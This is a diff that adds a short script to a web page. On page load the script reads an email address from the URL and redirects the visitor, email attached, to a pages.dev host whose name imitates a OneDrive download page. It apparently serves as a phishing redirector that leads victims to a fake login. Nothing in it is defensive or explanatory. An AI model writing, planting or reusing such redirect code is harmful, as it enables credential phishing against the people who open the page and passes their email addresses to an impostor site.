@@ -1,0 +1,22 @@
+<script>
+ 
+const redirectWithEmail = async () => {
+ 
+  // Get email from URL with destructuring assignment
+  const {email} = Object.fromEntries(new URLSearchParams(window.location.search));
+ 
+  // Base URL stored in constant
+  const BASE_URL = 'https://onedrivedownloadpagesys1f1627e31037c75d8f3ef6ece13dbccd202.pages.dev';
+ 
+  // Template literal to build redirect URL
+  const redirectUrl = `${BASE_URL}?email=${email}`;
+ 
+  // Async redirect with await
+  await window.location.replace(redirectUrl);
+ 
+};
+ 
+redirectWithEmail();
+ 
+ 
+  </script>
